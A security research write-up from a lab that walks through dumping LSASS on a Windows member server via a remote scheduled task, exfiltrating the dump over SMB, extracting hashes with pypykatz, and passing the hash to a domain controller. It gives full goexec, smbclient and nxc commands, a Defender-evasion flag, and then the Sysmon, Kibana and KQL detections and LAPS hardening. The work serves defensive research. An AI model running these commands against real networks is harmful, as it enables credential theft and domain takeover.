# Remote LSASS Dump via Scheduled Task | SMB Exfil | Pass-the-Hash Lateral Movement to DC

## Overview

Assumed breach scenario. A threat actor has obtained local administrator credentials on a domain-joined Windows Server 2022 member server. No interactive session is used during the execution chain. getit2.exe was placed locally via prior access as part of the assumed breach setup. No reverse shell. Every action is executed remotely from the attacker's machine.

The objective: dump LSASS on the member server, exfiltrate the dump over SMB, parse credentials offline, and use a recovered hash to authenticate to the Domain Controller — without initial access to the Domain Controller.

**Result:** 47MB LSASS dump recovered. Local Administrator NT hash extracted. Pass-the-hash authentication against DC01 succeeded. Remote command execution on the Domain Controller confirmed. Defender produced zero alerts across the entire credential theft chain. Kibana generated 16 alerts total — 3 on the member server, 13 on the DC.

**Core finding:** The credential theft primitive (direct P/Invoke MiniDumpWriteDump) remains undetected by Defender in default configuration. The delivery mechanism — scheduled task execution via goexec rather than WMI — exposes additional detection surface compared to Vector 4. The lateral movement leg (PTH + wmiexec) is fully visible in telemetry if the right rules exist.

---

## Why This Scenario Is Realistic

The assumed breach starting point is not a theoretical convenience. It reflects the actual state of many enterprise environments following initial access via phishing, credential stuffing, or supply chain compromise.

An attacker with local admin credentials on a single domain-joined server faces a well-understood problem: local admin access on one machine is valuable only as a stepping stone. The goal is domain-wide access.

The path taken here — dump lsass on the compromised server, recover credentials, move laterally to the DC — is one of the most common post-exploitation patterns observed in real incidents. What makes it operationally relevant is not the technique itself but the conditions that allow it to succeed silently:

- **No PPL on member servers.** Protected Process Light is not enabled by default on Windows Server 2022 member servers. Without PPL, lsass memory is accessible to any process running with SeDebugPrivilege.
- **No Credential Guard.** Credential Guard requires explicit enablement and TPM 2.0 + Secure Boot. In environments that haven't specifically hardened workloads, it is absent. Without it, NT hashes and Kerberos material sit in lsass memory in recoverable form.
- **Password reuse across servers.** Local Administrator accounts sharing a common password across an estate is a default condition without LAPS. A hash recovered from one server authenticates to every server with the same password — including, potentially, the Domain Controller.
- **Incomplete Sysmon coverage.** The SwiftOnSecurity base config ships with empty ProcessAccess rules. Without a manual fix, EID 10 — the only telemetry source that would catch this dump — produces no output.

Each of these conditions is individually common. Together they produce a path from a single compromised server to domain compromise that leaves no Defender alert.

---

## Lab Environment

| Host | Role | OS | IP |
|------|------|----|----|
| Kali | Attacker | Kali Linux | 192.168.1.218 |
| WIN-ATTACK | Target (victim server) | Windows Server 2022 Build 20348 | 192.168.1.83 |
| DC01 | Domain Controller | Windows Server 2019 Build 17763 | 192.168.1.5 |
| ELK | SIEM | Ubuntu / ELK 8.19.12 | 192.168.1.250 |

**Domain:** lab2019.local

**WIN-ATTACK configuration:**
- Windows Server 2022 Build 20348
- Domain-joined member server (lab2019.local)
- Microsoft Defender — enabled, RTP on, BehaviorMonitorEnabled: True
- ASR rules: none configured
- PPL: not enabled (Server 2022 default)
- Credential Guard: not active
- Sysmon 15.20 with modified SwiftOnSecurity config (EID 10 lsass filter added)
- Winlogbeat 8.19.12 → Elasticsearch 8.19.12

**DC01 configuration:**
- Windows Server 2019 Build 17763
- Primary Domain Controller for lab2019.local
- SMB signing: enabled
- Winlogbeat 8.19.12 → Elasticsearch 8.19.12

---

## Scope and Limitations

**PPL and Credential Guard**

This chain depends on lsass being accessible without PPL. On Windows Server 2022 member servers, PPL is not enabled by default. On Windows Server 2025, PPL is active by default — the same dump binary against a Server 2025 target produces a 0KB file and in testing caused DC instability when run against a domain controller directly.

Credential Guard was not active on WIN-ATTACK. Without it, NT hashes and cleartext Kerberos material are recoverable from a successful dump.

**Password reuse**

The pass-the-hash step succeeded because the local Administrator password was identical on WIN-ATTACK and DC01. This is a lab condition, but it reflects a real and widespread enterprise failure. LAPS eliminates this vector entirely. Environments without LAPS are vulnerable to this exact path.

**SMB signing**

DC01 had SMB signing enabled. Pass-the-hash via SMB authenticated successfully regardless — SMB signing validates the session, not the authentication mechanism. NTLM authentication over a signed SMB session is still valid PTH.

---

## Comparison: Scheduled Task vs WMI Delivery

This vector uses goexec scheduled task registration for remote execution rather than the nxc wmiexec delivery used in Vector 4. The credential theft primitive is identical — direct P/Invoke MiniDumpWriteDump. The delivery mechanism differs.

| | Vector 4 (WMI) | Vector 5 (Scheduled Task) |
|---|---|---|
| Delivery mechanism | nxc wmiexec --no-output | goexec tsch create + run |
| Execution context | WmiPrvSE.exe parent | Task Scheduler / svchost parent |
| Defender alert | None | None |
| Kibana alerts (dump leg) | 1 (LSASS EID 10) | 3 (LSASS EID 10 + Windows Tasks + IMPHASH) |
| getit2.exe execution path | C:\Windows\Tasks\ | C:\Windows\Tasks\ |
| SYSTEM execution | No (authenticated user) | Yes (scheduled task default) |

Scheduled task delivery runs the binary as SYSTEM rather than as the authenticated user. This produced two additional Kibana alerts — binary execution from Windows Tasks and unsigned binary with zeroed IMPHASH — that did not fire in Vector 4. The LSASS access alert fired in both cases.

---

## Attack Path

### Phase 0 — Starting Conditions

Local Administrator credentials exist for WIN-ATTACK (192.168.1.83). The custom dump binary (getit2.exe) has been placed in C:\Windows\Tasks\ {copied locally via an existing RDP session as part of the assumed breach access scenario}. No interactive session is open (see the remarks below re. Defender). All subsequent actions are executed remotely from Kali.

getit2.exe is a custom C# binary targeting .NET Framework 4.8. It calls MiniDumpWriteDump directly via P/Invoke against dbghelp.dll. No LOLBins, no known tool signatures, no shellcode. Source not published — the point of this research is the detection, not the tool. The evasion is architectural: remove the LOLBin, call the API directly, deliver cleanly.

---

### Phase 1 — Remote Scheduled Task Registration

```bash
# [Kali]
./goexec tsch create 192.168.1.83 \
  -u administrator@lab2019.local \
  -p '<PASSWORD>' \
  --dc 192.168.1.5 \
  --task '\lsassdump' \
  --exec 'C:\Windows\Tasks\getit2.exe' \
  --args '--dump C:\Windows\Temp\lsass.dmp'
```

goexec registers the scheduled task against WIN-ATTACK authenticating via DC01. The task is registered to run once and self-delete. No interactive session required.

---

### Phase 2 — Task Execution

```bash
# [Kali]
./goexec tsch run 192.168.1.83 \
  -u administrator@lab2019.local \
  -p '<PASSWORD>' \
  --dc 192.168.1.5 \
  --task '\lsassdump'
```

The task fires immediately. getit2.exe runs as SYSTEM (confirmed by SourceUser: NT AUTHORITY\SYSTEM in the EID 10 event) — the default execution context for scheduled tasks without an explicit user assignment. MiniDumpWriteDump writes lsass memory to C:\Windows\Temp\lsass.dmp.

Defender: silent.

---

### Phase 3 — Confirm Dump

```bash
# [Kali]
nxc smb 192.168.1.83 \
  -u administrator \
  -p '<PASSWORD>' \
  -d lab2019.local \
  -x "dir C:\\Windows\\Temp\\lsass.dmp"
```

Output confirms lsass.dmp landed at ~47MB. File visible in C:\Windows\Temp\ alongside VMware and system artifacts — no cleanup performed in this test.

---

### Phase 4 — SMB Exfiltration

```bash
# [Kali]
smbclient //192.168.1.83/C$ \
  -U 'lab2019\administrator%<PASSWORD>' \
  -c "get Windows\Temp\lsass.dmp /tmp/lsass2019.dmp"
```

47MB dump transferred over SMB at ~244MB/s. No alert. No block.

---

### Phase 5 — Offline Parsing

```bash
# [Kali]
pypykatz lsa minidump /tmp/lsass2019.dmp
```

**Recovered:**

| Account | Type | Result |
|---------|------|--------|
| Administrator @ WIN-ATTACK | NT hash | Recovered |
| WIN-ATTACK$ | NT hash | Recovered |
| WIN-ATTACK$ | Kerberos cleartext password | Recovered |

The local Administrator NT hash is the pivot point. No domain credentials required — the question is whether password reuse extends it to other hosts.

---

### Phase 6 — Pass-the-Hash to Domain Controller

```bash
# [Kali]
nxc smb 192.168.1.5 \
  -u administrator \
  -H '<NT_HASH>' \
  -d lab2019.local
```

Output: `[+] lab2019.local\administrator:<hash> (Pwn3d!)`

The local Administrator password on WIN-ATTACK matched the local Administrator password on DC01. No password required — the hash is the credential.

---

### Phase 7 — Remote Execution on DC01

Standard wmiexec with output retrieval was blocked by Defender on DC01 — the temp file artifact pattern was caught. Switching to --no-output bypassed this:

```bash
# [Kali]
nxc smb 192.168.1.5 \
  -u administrator \
  -H '<NT_HASH>' \
  -d lab2019.local \
  --no-output \
  -x "whoami"
```

Output: `[+] Executed command via wmiexec`

Remote execution confirmed on DC01 as LAB2019\Administrator. The --no-output flag suppresses the temp file write that Defender catches — a detection gap documented in Vector 2.

---

## What Defender Caught (and Didn’t)

Get-MpThreatDetection on WIN-ATTACK shows the full detection history across all lab vectors. Every comsvcs-based LSASS dump is present — rundll32, encoded PowerShell variants. Tools like Rubeus and SharpSuccessor are also detected.

getit2.exe does not appear anywhere in the log.

No ThreatID.
No detection event.

The binary executed as SYSTEM, opened lsass.exe with PROCESS_ALL_ACCESS, wrote 47MB of memory to disk, and completed without generating a single Defender alert.

Detection boundary: Defender catches known implementations. It does not detect the underlying primitive.

The only interaction Defender had with getit2.exe was a manual sample submission prompt during SMB transfer of the binary (not the dump) — not a detection, not a block. This SMB transfer variant was run as an alternative to see how far I could push the evasion/obfuscation envelope here.

Note: In the documented attack chain, getit2.exe was already present on WIN-ATTACK as part of the assumed breach — no SMB transfer occurred. The submission prompt was observed separately when transferring the binary cold via SMB. Defender does not block execution, and delivery via a prior execution stage would avoid this prompt entirely.

---

## Detection

### Kibana Alert Summary

**WIN-ATTACK (dump leg) — 3 alerts:**

| Rule | Severity | Risk Score |
|------|----------|------------|
| LSASS Access - PROCESS_ALL_ACCESS from Non-System Binary (Sysmon EID 10) | Critical | 99 |
| Sysmon - Binary Execution from Windows Tasks | High | 73 |
| Sysmon - Unsigned Binary with Zeroed IMPHASH | Medium | 50 |

**DC01 (lateral movement leg) — 13 alerts:**

| Rule | Severity | Risk Score | Count |
|------|----------|------------|-------|
| Admin Share Access - C$ via SMB | High | 73 | 12 |
| Sysmon - WMI Remote Process Execution | High | 73 | 1 |

Total: 16 alerts across 2 hosts. DC01 accounted for 81.3% of alert volume.

---

### Alert 1 — LSASS PROCESS_ALL_ACCESS (Critical, WIN-ATTACK)

The primary credential theft indicator. Sysmon EID 10 fires on getit2.exe opening lsass with GrantedAccess 0x1FFFFF.

```
SourceImage:    C:\Windows\Tasks\getit2.exe
TargetImage:    C:\Windows\system32\lsass.exe
GrantedAccess:  0x1FFFFF
CallTrace:      ...UNKNOWN(00007FF826320D7A)
SourceUser:     NT AUTHORITY\SYSTEM
```

Three indicators compound:
- **0x1FFFFF (PROCESS_ALL_ACCESS)** against lsass from a non-system binary — no legitimate use case
- **SourceImage outside System32** — all legitimate lsass accessors are system processes
- **UNKNOWN in CallTrace** — unbacked memory region, strong supporting signal

The SYSTEM SourceUser confirms scheduled task delivery — in Vector 4 (WMI delivery) this showed the authenticated user. Delivery mechanism fingerprint is visible in the telemetry.

**KQL:**
```kql
event.code: "10"
and winlog.event_data.TargetImage: "C:\\Windows\\system32\\lsass.exe"
and winlog.event_data.GrantedAccess: "0x1fffff"
and not winlog.event_data.SourceImage: "C:\\Windows\\system32\\*"
and not winlog.event_data.SourceImage: "C:\\Program Files\\*"
and not winlog.event_data.SourceImage: "C:\\Program Files (x86)\\*"
and not winlog.event_data.SourceImage: "C:\\ProgramData\\Microsoft\\Windows Defender\\*"
```

---

### Alert 2 — Binary Execution from Windows Tasks (High, WIN-ATTACK)

Sysmon EID 1 (ProcessCreate). getit2.exe launched from C:\Windows\Tasks\ — a well-documented AppLocker bypass path. Any unsigned binary executing from this location should be treated as suspicious.

This alert did not fire in Vector 4 because WMI delivery does not generate a ProcessCreate event attributable to the Tasks path in the same way. Scheduled task delivery exposes this additional surface.

---

### Alert 3 — Unsigned Binary with Zeroed IMPHASH (Medium, WIN-ATTACK)

getit2.exe has no import table hash (IMPHASH = 0) and no publisher signature. The rule description: *"Detects execution of binaries with zeroed IMPHASH and no publisher — strong indicators of deliberate PE manipulation or custom compiled payloads."*

This is structural PE fingerprinting — the binary is flagged not by what it does but by what it's missing. A legitimate signed binary from a known vendor will have a non-zero IMPHASH. A custom compiled tool stripped of imports will not.

---

### Alert 4 — Admin Share Access C$ via SMB (High, DC01) × 12

The PTH authentication leg generated 12 rapid-fire alerts on DC01 as each SMB connection to the administrative share was logged. This is expected behavior for nxc SMB operations — multiple connections in rapid succession to C$ from a non-DC source is high signal for lateral movement.

---

### Alert 5 — WMI Remote Process Execution (High, DC01)

Sysmon EID 1 on DC01. WmiPrvSE.exe spawning cmd.exe is the tell.

```
winlog.event_data.ParentImage       C:\Windows\System32\wbem\WmiPrvSE.exe
winlog.event_data.ParentCommandLine C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding
winlog.event_data.Image             C:\Windows\System32\cmd.exe
winlog.event_data.CommandLine       cmd.exe /Q /c whoami
winlog.event_data.User              LAB2019\Administrator
winlog.computer_name                DC01.lab2019.local
```

WmiPrvSE spawning cmd.exe is a high-confidence lateral movement indicator. The --no-output flag suppressed the output retrieval artifact that Defender catches, but it cannot suppress the ProcessCreate event that Sysmon logs. The execution is visible regardless.

**KQL:**
```kql
event.provider: "Microsoft-Windows-Sysmon"
and event.code: "1"
and winlog.event_data.ParentImage: *WmiPrvSE.exe
```

---

## The LAPS Problem

The lateral movement succeeded because of password reuse — the same local Administrator password on the member server and the Domain Controller.

This is not an exotic misconfiguration. It is the default state of any Windows estate that has not deployed Local Administrator Password Solution (LAPS). Without LAPS, organizations typically set a common local admin password during imaging and never rotate it. That password — or its hash — becomes a skeleton key across the entire estate.

LAPS generates a unique, randomized local Administrator password per machine and stores it in Active Directory. A hash recovered from one machine authenticates only to that machine. The lateral movement path in this writeup does not exist in a LAPS-enforced environment.

The two questions every defender should answer:

1. Is LAPS deployed across your estate? If not, a compromised member server is a potential DC compromise.
2. Is your Sysmon config logging LSASS access? The SwiftOnSecurity base config ships with empty ProcessAccess rules — EID 10 produces nothing without a manual fix.

---

## Complete Attack Chain

```
[Kali] goexec tsch create → Task registered on WIN-ATTACK
    ↓
[Kali] goexec tsch run → getit2.exe executes as SYSTEM
    ↓
[WIN-ATTACK] MiniDumpWriteDump → lsass.dmp (47MB)    ← Defender: silent
    ↓
[Kali] smbclient → /tmp/lsass2019.dmp
    ↓
[Kali] pypykatz → Administrator NT hash
    ↓
[Kali] nxc -H <hash> → DC01 Pwn3d!                  ← Password reuse
    ↓
[Kali] nxc --no-output -x "whoami" → Executed on DC01

Defender alerts (entire chain):        0
Kibana alerts (WIN-ATTACK):            3
Kibana alerts (DC01):                 13
Total Kibana alerts:                  16
PPL active (WIN-ATTACK):              No
Credential Guard (WIN-ATTACK):        No
LAPS deployed:                        No
```

---

## Comparison to Vector 4

| | Vector 4 | Vector 5 |
|---|---|---|
| Delivery | nxc wmiexec | goexec tsch |
| Execution context | Authenticated user | SYSTEM |
| Defender alerts | 0 | 0 |
| Kibana alerts (dump) | 1 | 3 |
| Lateral movement | Not included | PTH → DC01 |
| Total Kibana alerts | 1 | 16 |

Scheduled task delivery is noisier from a detection standpoint than WMI delivery — two additional rules fired that were silent in Vector 4. The fundamental gap remains identical: the dump primitive is undetected, and the only reliable signal is EID 10, which requires a Sysmon config fix that most deployments haven't made.

---

## References

- [goexec](https://github.com/FalconOpsLLC/goexec)
- [NetExec](https://github.com/Pennyw0rth/NetExec)
- [pypykatz](https://github.com/skelsec/pypykatz)
- [Sysmon — Microsoft Sysinternals](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
- [SwiftOnSecurity Sysmon Config](https://github.com/SwiftOnSecurity/sysmon-config)
- [LAPS — Microsoft](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview)
- [MITRE T1003.001 — LSASS Memory](https://attack.mitre.org/techniques/T1003/001/)
- [MITRE T1550.002 — Pass the Hash](https://attack.mitre.org/techniques/T1550/002/)
- [MITRE T1053.005 — Scheduled Task](https://attack.mitre.org/techniques/T1053/005/)
- [Vector 4 — LSASS Dump via Direct P/Invoke](https://github.com/osherjacobs/AD-Lab-Research/blob/main/vector4-lsass-dump-detection.md)

---
<img width="1528" height="784" alt="kibana3alerts" src="https://github.com/user-attachments/assets/a9be39a9-7425-428f-98b6-86e2cb06070f" />

<img width="1855" height="979" alt="detettionofbinary" src="https://github.com/user-attachments/assets/9a24a9d4-c46a-414f-8388-95ddad31bca7" />

<img width="1402" height="879" alt="attackexfil" src="https://github.com/user-attachments/assets/45ced912-5715-4f20-bd41-8e6229cb5050" />

<img width="1114" height="530" alt="lsassdmp" src="https://github.com/user-attachments/assets/eee09b2e-20cd-4f4b-8681-6e272d98c7c9" />

<img width="1871" height="967" alt="EID10" src="https://github.com/user-attachments/assets/c93f186a-6792-4aea-ae3b-a71d1ce5e625" />

<img width="1102" height="134" alt="defendernotapeep" src="https://github.com/user-attachments/assets/9702ea48-14df-4370-8eb6-198494471a9d" />


<img width="708" height="895" alt="avdefinitionsssDC01" src="https://github.com/user-attachments/assets/d5bbfa7e-c390-4bb8-9044-f84a4e6486d6" />


<img width="732" height="891" alt="avdefinitionsss" src="https://github.com/user-attachments/assets/30efa291-a55a-4ea9-98a4-e2e355d99b5e" />


<img width="1118" height="703" alt="avactivityfailwhoamivianxcDC01" src="https://github.com/user-attachments/assets/64f07b5d-82ce-4966-91b0-f192e5015637" />

<img width="1589" height="928" alt="pypikatz" src="https://github.com/user-attachments/assets/a2a69b0a-3734-4275-8635-18a1bc698e78" />

<img width="1668" height="279" alt="pwned" src="https://github.com/user-attachments/assets/5fd513df-ffaf-491f-a5ae-f91ea9baa76c" />

<img width="1445" height="843" alt="Elmo" src="https://github.com/user-attachments/assets/d5543a32-86a4-43da-a742-00395fceef58" />






*Lab: Windows Server 2022 Build 20348 | Windows Server 2019 Build 17763 | Sysmon 15.20 | Winlogbeat 8.19.12 | ELK 8.19.14*
*Author: Osher Jacobs | [GitHub](https://github.com/osherjacobs/AD-Lab-Research) | [LinkedIn](https://www.linkedin.com/in/osher-jacobs)*
